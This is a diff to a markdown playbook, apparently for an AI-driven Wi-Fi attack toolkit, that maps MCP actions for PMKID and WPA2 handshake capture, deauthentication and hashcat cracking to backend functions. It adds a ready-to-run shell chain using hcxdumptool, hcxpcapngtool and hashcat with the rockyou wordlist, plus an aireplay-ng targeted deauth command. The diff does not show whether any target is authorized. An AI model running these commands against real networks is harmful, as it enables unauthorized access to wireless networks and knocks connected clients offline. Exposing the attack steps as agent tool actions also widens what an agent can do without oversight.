@@ -98,6 +98,41 @@ and replace it with PMF-safe capture paths:
   in play, FT reassoc frames yield hashcat-22000 material even
   without a deauth.
 
+## MCP mapping
+
+The sequence above uses only actions with real backing tools in `src/`:
+
+- `capture_pmkid` → `server.do_capture_pmkid` (hcxdumptool via SSH).
+- `capture_handshake` → `server.do_capture_handshake` (hcxdumptool +
+  optional targeted deauth). Note: the parameter name is
+  `deauth_client=<mac>`, not `client` + `deauth_count` — the count is
+  hard-coded by the underlying `attacks.capture_handshake` primitive.
+  If you want an explicit deauth burst first, prepend a separate
+  `{"action": "deauth", ...}` step (maps to `server.do_deauth`).
+- `convert_to_hashcat` → `server.convert_to_hashcat` (hcxpcapngtool
+  under the hood; `rules` is a hashcat-invocation knob, not a
+  conversion knob — move it to `crack_start` in real runs).
+- `crack_start` → `server.crack_start`.
+
+## Fallback shell chain (no MCP)
+
+```bash
+# 1. capture (either PMKID or full 4-way — pick one interface run)
+sudo hcxdumptool -i wlan1 -c 6a -w /tmp/hs.pcapng \
+    --disable_deauthentication=1
+# 2. convert
+hcxpcapngtool -o /tmp/hs.22000 /tmp/hs.pcapng
+# 3. crack
+hashcat -m 22000 /tmp/hs.22000 /opt/wordlists/rockyou.txt \
+    -r rules/best64.rule
+```
+
+If you need a targeted deauth (only on PMF-off targets):
+
+```bash
+sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan1mon
+```
+
 ## Cite
 
 - attacks.json: `wpa2-4way-capture`, `pmkid-capture`,
